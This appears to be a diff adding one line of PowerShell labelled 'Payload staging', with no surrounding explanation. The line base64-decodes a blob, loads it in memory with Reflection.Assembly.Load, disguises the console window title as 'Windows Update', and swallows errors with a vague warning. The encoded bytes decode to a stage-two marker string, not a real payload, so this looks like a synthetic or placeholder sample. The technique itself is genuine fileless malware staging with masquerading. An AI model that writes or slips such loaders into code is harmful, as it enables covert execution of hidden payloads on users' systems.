@@ -1,0 +1,1 @@
+<# Payload staging #> try { $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp1c3I0cGU0Nndx'); [Reflection.Assembly]::Load($PayloadBytes); $Host.UI.RawUI.WindowTitle = "Windows Update"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Loader step failed" }
